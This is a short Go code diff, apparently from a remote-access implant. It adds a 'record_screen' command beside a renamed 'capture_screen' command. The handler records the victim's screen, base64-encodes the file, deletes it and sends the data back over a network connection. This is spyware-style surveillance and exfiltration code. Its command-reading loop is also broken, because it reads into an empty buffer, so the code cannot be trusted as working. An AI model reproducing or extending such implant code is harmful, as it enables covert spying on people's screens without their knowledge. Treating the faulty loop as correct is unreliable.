@@ -99,8 +99,11 @@ func engage_via(conn net.Conn) {
 	for {
 		var cmd, result string
 		conn.Read([]byte(cmd))
-		if cmd == "screenshot" {
+		if cmd == "capture_screen" {
 			result = screen_capture()
+			conn.Write([]byte(result))
+		} else if cmd == "record_screen" {
+			result = screen_record(5)
 			conn.Write([]byte(result))
 		}
 	}
@@ -144,6 +147,6 @@ func screen_record(t int) string {
 	capture.Close()
 	result := b64_file(file) 
 	os.Remove(file)
-	
+
 	return result
 }
